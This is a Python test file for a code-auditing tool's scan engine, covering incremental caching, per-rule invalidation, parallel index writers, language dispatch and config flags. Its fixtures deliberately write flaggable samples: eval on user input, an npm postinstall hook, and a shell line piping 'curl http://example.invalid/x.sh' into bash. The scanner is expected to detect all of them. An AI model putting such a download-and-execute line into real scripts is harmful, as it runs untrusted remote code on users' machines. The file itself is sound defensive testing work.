"""Scan engine + per-rule incremental cache + parallel-writer safety (async)."""

import asyncio
from pathlib import Path

from auditor.config import load_config
from auditor.engine import ScanEngine, audit_target
from auditor.index import IndexStore
from auditor.languages.python.resolve import CalleeResolver
from auditor.paths import index_db_path


def _make_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\ndependencies = ["pydantic"]\n'
        '[tool.auditor]\nextends = "base"\n'
    )
    (tmp_path / ".auditor").mkdir()
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "a.py").write_text("def f(x):\n    eval(x)\n    return x\n")
    (pkg / "b.py").write_text("def g(y):\n    return y\n")
    return tmp_path


async def _scan_dir(root: Path, target: Path, settings, index) -> dict:
    results = await ScanEngine.for_target(
        target, settings=settings, index=index
    ).scan_path(target)
    return {r.file: r for r in results}


async def test_stateless_scan_no_db(tmp_path):
    root = _make_repo(tmp_path)
    res = await ScanEngine.for_target(root / "pkg" / "a.py").scan_file(
        root / "pkg" / "a.py"
    )
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in res.findings}
    assert not (root / ".auditor" / "index.db").exists()  # never written in-repo
    assert not index_db_path().exists()  # a stateless scan writes no cache anywhere
    assert res.cached is False


async def test_incremental_cache_reuses_unchanged(tmp_path):
    root = _make_repo(tmp_path)
    settings = load_config(root)
    db = root / ".auditor" / "index.db"

    async with await IndexStore.connect(db) as index:
        first = await _scan_dir(root, root / "pkg", settings, index)
        assert all(r.cached is False for r in first.values())

    # Re-scan with no edits: everything served from cache.
    async with await IndexStore.connect(db) as index:
        second = await _scan_dir(root, root / "pkg", settings, index)
        assert all(r.cached for r in second.values())

    # Edit one file: only it re-parses; the other stays cached.
    (root / "pkg" / "a.py").write_text("def f(x):\n    return x\n")
    async with await IndexStore.connect(db) as index:
        third = await _scan_dir(root, root / "pkg", settings, index)
        assert third["pkg/a.py"].cached is False
        assert third["pkg/b.py"].cached is True
        assert "PY-SEC-DANGEROUS-EVAL" not in {
            f.rule_id for f in third["pkg/a.py"].findings
        }


async def test_per_rule_invalidation(tmp_path):
    root = _make_repo(tmp_path)
    db = root / ".auditor" / "index.db"
    settings = load_config(root)
    async with await IndexStore.connect(db) as index:
        await _scan_dir(root, root / "pkg", settings, index)

    # Lower a threshold for one rule via config; only that rule should re-run.
    (root / ".auditor" / "config.toml").write_text(
        'extends = "base"\n[rules]\nPY-STYLE-FILE-SIZE = { threshold = { size = { file_max_lines = 1 } } }\n'
    )
    settings2 = load_config(root)
    async with await IndexStore.connect(db) as index:
        res = await _scan_dir(root, root / "pkg", settings2, index)
    assert "PY-STYLE-FILE-SIZE" in {f.rule_id for f in res["pkg/b.py"].findings}


async def test_parallel_writers(tmp_path):
    root = _make_repo(tmp_path)
    settings = load_config(root)
    db = root / ".auditor" / "index.db"
    files = [root / "pkg" / "a.py", root / "pkg" / "b.py"]

    async def worker(p: Path) -> int:
        async with await IndexStore.connect(db) as index:
            res = await ScanEngine.for_target(
                p, settings=settings, index=index
            ).scan_file(p)
            return len(res.findings)

    results = await asyncio.gather(*[worker(p) for p in files * 4])
    assert all(isinstance(n, int) for n in results)
    async with await IndexStore.connect(db) as index:
        assert len(await index.files()) == 2


async def test_scan_dispatches_each_language(tmp_path):
    """Discovery + dispatch route every language through the engine: a `.py` (by suffix), a `.sh`
    (by suffix), and a `package.json` (by filename) each reach their auditor and surface their
    representative rule. Also exercises the engine's rule-id pre-filter for shell/manifest."""
    root = tmp_path
    (root / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\n[tool.auditor]\nextends = "base"\n'
    )
    (root / ".auditor").mkdir()
    src = root / "src"
    src.mkdir()
    (src / "a.py").write_text("eval(user_input)\n")
    (src / "deploy.sh").write_text("curl http://example.invalid/x.sh | bash\n")
    (src / "package.json").write_text('{"scripts": {"postinstall": "node x.js"}}\n')

    settings = load_config(root)
    async with await IndexStore.connect(root / ".auditor" / "index.db") as index:
        results = await _scan_dir(root, src, settings, index)

    langs = {f: r.language for f, r in results.items()}
    assert langs == {
        "src/a.py": "python",
        "src/deploy.sh": "shell",
        "src/package.json": "manifest",
    }
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in results["src/a.py"].findings}
    assert "SH-MAL-CURL-BASH" in {f.rule_id for f in results["src/deploy.sh"].findings}
    assert "MF-SUPPLY-INSTALL-HOOK" in {
        f.rule_id for f in results["src/package.json"].findings
    }


async def test_deleted_file_is_pruned_from_index(tmp_path):
    root = _make_repo(tmp_path)
    db = root / ".auditor" / "index.db"
    settings = load_config(root)
    async with await IndexStore.connect(db) as index:
        await _scan_dir(root, root / "pkg", settings, index)
        assert {e.path for e in await index.files()} == {"pkg/a.py", "pkg/b.py"}

    (root / "pkg" / "a.py").unlink()  # delete a file, then rescan
    async with await IndexStore.connect(db) as index:
        results = await _scan_dir(root, root / "pkg", settings, index)
        assert "pkg/a.py" not in results
        # reconciled out of every table, so `index list` / aggregate don't show a ghost file
        assert {e.path for e in await index.files()} == {"pkg/b.py"}


async def test_deleting_one_of_a_dup_pair_clears_the_crossfile_finding(tmp_path):
    # two files share a model shape -> both flagged; deleting one must clear the survivor's dup
    # finding (no phantom cross-file finding against a file that no longer exists)
    root = tmp_path
    (root / "pyproject.toml").write_text(
        '[project]\nname="x"\nversion="0"\ndependencies=["pydantic"]\n'
        '[tool.auditor]\nextends="strict"\n'
    )
    (root / ".auditor").mkdir()
    pkg = root / "pkg"
    pkg.mkdir()
    fields = "    a: int\n    b: str\n    c: float\n"
    (pkg / "a.py").write_text(
        f"from pydantic import BaseModel\nclass Alpha(BaseModel):\n{fields}"
    )
    (pkg / "b.py").write_text(
        f"from pydantic import BaseModel\nclass Beta(BaseModel):\n{fields}"
    )
    settings = load_config(root)
    db = root / ".auditor" / "index.db"

    async with await IndexStore.connect(db) as index:
        first = await _scan_dir(root, pkg, settings, index)
        assert "PY-XFILE-DUP-MODEL" in {f.rule_id for f in first["pkg/b.py"].findings}

    (pkg / "a.py").unlink()
    async with await IndexStore.connect(db) as index:
        second = await _scan_dir(root, pkg, settings, index)
        assert "pkg/a.py" not in second
        assert "PY-XFILE-DUP-MODEL" not in {
            f.rule_id for f in second["pkg/b.py"].findings
        }
        # and no stale finding lingers in the table for aggregate to pick up
        assert all("a.py" not in str(f) for f in await index.all_findings())


def test_audit_target_config_overrides(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    (tmp_path / "a.py").write_text("def f(x):\n    eval(x)\n")
    results = asyncio.run(
        audit_target(
            tmp_path,
            no_index=True,
            config_overrides={"rules": {"PY-SEC-DANGEROUS-EVAL": {"severity": "low"}}},
        )
    )
    sev = next(
        f.severity.value
        for r in results
        for f in r.findings
        if f.rule_id == "PY-SEC-DANGEROUS-EVAL"
    )
    assert sev == "low"  # override lowered the severity


# ---------------------------------------------------------------------------
# New characterisation / coverage tests for audit_target flag branches
# ---------------------------------------------------------------------------


def _make_test_repo(tmp_path: Path) -> Path:
    """Repo with a production file (eval) and a test file (eval) side by side."""
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\n[tool.auditor]\nextends = "base"\n'
    )
    (tmp_path / ".auditor").mkdir()
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "app.py").write_text("def f(x):\n    eval(x)\n    return x\n")
    tests = tmp_path / "tests"
    tests.mkdir()
    # Use a variable argument so the eval-on-input detector fires (literal arg is safe)
    (tests / "test_app.py").write_text(
        "def test_f(user_input):\n    eval(user_input)\n"
    )
    return tmp_path


def test_audit_target_strict_tests_enables_relaxed_rule(tmp_path):
    """strict_tests=True forces test files into strict mode, so rules normally relaxed on
    test code (like PY-SEC-DANGEROUS-EVAL) fire against them too."""
    root = _make_test_repo(tmp_path)
    results = asyncio.run(audit_target(root, no_index=True, strict_tests=True))
    by_file = {r.file: r for r in results}
    test_file = next((k for k in by_file if "test_app" in k), None)
    assert test_file is not None
    rule_ids_in_test = {f.rule_id for f in by_file[test_file].findings}
    # Under strict_tests the normally-relaxed test role is strict, so eval fires
    assert "PY-SEC-DANGEROUS-EVAL" in rule_ids_in_test


def test_audit_target_no_skips_accepted(tmp_path):
    """no_skips=True is accepted and runs without error (skip directives are ignored)."""
    root = _make_test_repo(tmp_path)
    results = asyncio.run(audit_target(root, no_index=True, no_skips=True))
    assert isinstance(results, list)
    # Production file must still surface eval
    by_file = {r.file: r for r in results}
    prod_file = next((k for k in by_file if "app.py" in k and "test" not in k), None)
    assert prod_file is not None
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in by_file[prod_file].findings}


def test_audit_target_exclude_glob_accepted(tmp_path):
    """exclude=('*.py',) suppresses all Python results — the flag is wired through."""
    root = _make_test_repo(tmp_path)
    results = asyncio.run(audit_target(root, no_index=True, exclude=("*.py",)))
    # Every Python file is excluded — no findings remain
    all_findings = [f for r in results for f in r.findings]
    assert all_findings == []


def test_audit_target_include_gitignored_accepted(tmp_path):
    """include_gitignored=True is accepted and does not crash (smoke test)."""
    root = _make_test_repo(tmp_path)
    # Not a git repo, so gitignore handling is a no-op — just verify no exception
    results = asyncio.run(audit_target(root, no_index=True, include_gitignored=True))
    assert isinstance(results, list)


def test_engine_builds_callee_resolver(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    engine = ScanEngine.for_target(tmp_path)
    assert isinstance(engine.resolver, CalleeResolver)


def test_scan_threads_resolver_without_error(tmp_path):
    # smoke: a real scan runs with the resolver wired through audit() (kwarg accepted end-to-end)
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="0"\n')
    (tmp_path / "m.py").write_text("def f():\n    return 1\n")
    results = asyncio.run(audit_target(tmp_path, no_index=True))
    assert isinstance(results, list)
